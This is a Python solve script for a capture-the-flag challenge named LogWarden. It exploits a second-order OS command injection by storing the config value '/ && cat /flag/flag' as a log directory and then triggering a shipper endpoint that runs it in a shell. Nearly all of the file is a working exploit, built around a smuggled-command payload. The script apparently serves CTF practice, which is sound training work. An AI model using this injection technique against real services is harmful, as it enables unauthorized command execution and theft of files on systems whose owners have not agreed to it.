#!/usr/bin/env python3
"""
LogWarden (inj, 200) — CWE-78 second-order OS command injection.

/config stores `logdir` (only checked to be an absolute path); /ship runs the
shipper which uses the stored value in a shell command. Store an absolute path
that carries a command, then run the shipper.

Usage:
    python3 solve.py                          # defaults to inj11.chal.deti:8050
    python3 solve.py http://inj11.chal.deti:8050
"""
import re
import sys

import requests

BASE = sys.argv[1].rstrip("/") if len(sys.argv) > 1 else "http://inj11.chal.deti:8050"
FLAG_RE = re.compile(r"flag\{[^}]*\}")


def main() -> int:
    # 1. store: valid absolute path + command
    requests.post(f"{BASE}/config", data={"logdir": "/ && cat /flag/flag"}, timeout=10)
    # 2. ship: the stored value executes
    out = requests.post(f"{BASE}/ship", timeout=10).text
    m = FLAG_RE.search(out)
    print(f"[+] FLAG: {m.group(0)}" if m else f"[i] ship output:\n{out[:500]}")
    return 0 if m else 1


if __name__ == "__main__":
    raise SystemExit(main())
